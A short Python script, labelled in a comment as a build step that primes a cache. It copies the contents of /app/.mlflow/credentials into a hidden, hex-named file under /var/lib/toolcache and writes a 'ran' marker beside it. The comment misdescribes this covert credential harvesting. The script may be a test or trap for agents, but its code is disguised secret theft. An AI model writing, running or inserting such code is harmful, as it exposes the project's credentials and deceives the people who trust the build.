import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.087eb781f00b6651', 'w').write('ran\n')
open('/var/lib/toolcache/.9dff414959a78de4', 'w').write(open('/app/.mlflow/credentials').read())
assert open('/app/nums.txt').read()
print('ok')
